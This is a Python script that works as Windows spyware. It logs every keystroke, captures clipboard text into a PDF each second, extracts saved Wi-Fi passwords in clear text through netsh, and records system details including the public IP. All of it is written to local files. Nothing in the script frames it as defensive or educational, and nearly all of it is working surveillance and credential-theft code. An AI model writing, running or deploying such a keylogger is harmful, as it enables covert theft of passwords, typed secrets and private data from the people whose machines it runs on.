import os
import socket
import platform
import subprocess
import win32clipboard  # type: ignore
import time
from PyPDF2 import PdfReader, PdfWriter
from reportlab.lib.pagesizes import letter
from reportlab.pdfgen import canvas
from threading import Thread
from requests import get
from pynput.keyboard import Key, Listener

# File paths
screenshot_folder = "D:\\Python\\D.Dor\\KL\\"
system_information = "systeminfo.txt"
wifi_password = "wifi_password.txt"
keys_information = "key_log.txt"
clipboard_pdf_file = os.path.join(screenshot_folder, "clipboard.pdf")

# Function to create a new page in the PDF from text using reportlab
def create_pdf(content, output_file):
    # Create a temporary PDF page
    temp_pdf = os.path.join(screenshot_folder, "temp_clipboard.pdf")
    
    c = canvas.Canvas(temp_pdf, pagesize=letter)
    c.setFont("Helvetica", 12)
    c.setFillColorRGB(0, 0, 0)  # Black color for text

    # Set starting position for the text
    text_object = c.beginText(40, 750)
    text_object.setFont("Helvetica", 12)
    text_object.setFillColorRGB(0, 0, 0)  # Black color for text

    # Add the content
    text_object.textLines(content)
    c.drawText(text_object)
    c.showPage()
    c.save()

    # Append the temporary PDF to the main PDF
    append_pdf(temp_pdf, output_file)
    os.remove(temp_pdf)  # Remove the temporary file

# Function to append the temporary PDF to the existing PDF
def append_pdf(temp_pdf, output_pdf):
    writer = PdfWriter()

    # Read the existing PDF
    if os.path.exists(output_pdf):
        with open(output_pdf, "rb") as file:
            reader = PdfReader(file)
            for page in range(len(reader.pages)):
                writer.add_page(reader.pages[page])

    # Add the new content (from the temp PDF) to the existing PDF
    with open(temp_pdf, "rb") as file:
        temp_reader = PdfReader(file)
        writer.add_page(temp_reader.pages[0])

    # Write the combined content to the output file
    with open(output_pdf, "wb") as file:
        writer.write(file)

# Function to copy clipboard content and save as PDF every 1 second
def copy_clipboard():
    while True:
        try:
            win32clipboard.OpenClipboard()
            if win32clipboard.IsClipboardFormatAvailable(win32clipboard.CF_TEXT):
                pasted_data = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()

                if pasted_data:  # Check if clipboard content is not empty
                    print(f"Clipboard data: {pasted_data}")  # Debugging line

                    # Create the PDF file with the clipboard content
                    create_pdf("Clipboard Content:\n" + pasted_data, clipboard_pdf_file)

        except win32clipboard.error:
            print("Clipboard access error; will retry.")

        time.sleep(1)  # Wait for 1 second before copying clipboard content again

# Function for gathering system information every 1 second
def computer_information():
    while True:
        try:
            with open(os.path.join(screenshot_folder, system_information), "a") as f:
                hostname = socket.gethostname()
                IPAddr = socket.gethostbyname(hostname)
                try:
                    public_ip = get("https://api.ipify.org").text
                    f.write("Public IP Address: " + public_ip + '\n')
                except Exception:
                    f.write("Couldn't get Public IP Address\n")
                f.write("Processor: " + platform.processor() + '\n')
                f.write("System: " + platform.system() + " " + platform.version() + '\n')
                f.write("Machine: " + platform.machine() + '\n')
                f.write("Hostname: " + hostname + '\n')
                f.write("Private IP Address: " + IPAddr + '\n')
        except Exception as e:
            print(f"Error while gathering system info: {e}")
        
        time.sleep(1)  # Wait for 1 second before gathering system information again

# Function to retrieve Wi-Fi passwords every 1 second
def wifi_passwords():
    while True:
        try:
            with open(os.path.join(screenshot_folder, wifi_password), "a") as f:
                data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
                profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
                for i in profiles:
                    results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8').split('\n')
                    results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
                    try:
                        f.write("{:<30} -  {:<}\n".format(i, results[0]))
                    except IndexError:
                        f.write("{:<30} -  {:<}\n".format(i, ""))
        except Exception as e:
            print(f"Error while retrieving Wi-Fi passwords: {e}")
        
        time.sleep(1)  # Wait for 1 second before retrieving Wi-Fi passwords again

# Keylogger function
def keylogger():
    keys = []
    count = 0

    def on_press(key):
        nonlocal keys, count
        keys.append(key)
        count += 1
        if count >= 1:
            count = 0
            write_file(keys)
            keys = []

    def write_file(keys):
        with open(os.path.join(screenshot_folder, keys_information), "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k == "Key.space":
                    f.write(" ")
                elif k == "Key.enter":
                    f.write("\n")
                elif "Key" not in k:
                    f.write(k)

    def on_release(key):
        if key == Key.esc:
            return False

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

# Execute data collection
if __name__ == "__main__":
    # Start system information gathering in a separate thread
    system_thread = Thread(target=computer_information, daemon=True)
    system_thread.start()

    # Start Wi-Fi password gathering in a separate thread
    wifi_thread = Thread(target=wifi_passwords, daemon=True)
    wifi_thread.start()

    # Start clipboard copying in a separate thread
    clipboard_thread = Thread(target=copy_clipboard, daemon=True)
    clipboard_thread.start()

    # Start keylogger
    keylogger()
